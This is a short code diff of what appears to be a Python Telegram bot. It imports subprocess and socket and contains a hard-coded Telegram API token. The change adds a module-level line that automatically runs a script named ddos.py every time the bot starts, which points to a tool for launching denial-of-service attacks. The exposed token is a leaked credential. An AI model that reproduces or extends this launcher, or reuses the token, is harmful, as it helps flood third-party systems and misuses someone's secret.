@@ -2,7 +2,9 @@ import telebot
 import subprocess
 import socket
 import sys
+import subprocess
 
+subprocess.call(['python', 'ddos.py'])
 # Telegram API token
 TOKEN = "7164751351:AAEDUgr3IhwPN9BaubCY6drE9_Vx7caGQPU"
 
